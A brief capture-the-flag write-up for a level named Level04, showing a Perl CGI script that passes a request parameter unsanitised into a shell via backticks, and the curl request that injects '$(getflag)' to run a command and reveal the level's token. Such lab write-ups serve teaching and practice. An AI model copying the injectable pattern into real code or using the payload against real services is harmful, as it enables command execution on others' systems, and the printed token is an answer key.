### Level04

In our HOME we can see a perl script:
```pearl
    #!/usr/bin/perl
    # localhost:4747
    use CGI qw{param};
    print "Content-type: text/html";
    sub x {
      $y = $_[0];
      print `echo $y 2>&1`;
    }
    x(param("x"));`
```

The script takes a parameter and then prints it to the screen. We are also told that the result is accessible on localhost:4747.

To get the flag, all we have to do is run a command of our choice through the script. 

`curl localhost:4747?x='$(getflag)'`

Here we use a subshell to make the script run the getflag command. So we get the token :

`ne2searoevaevoem4ov4ar8ap`
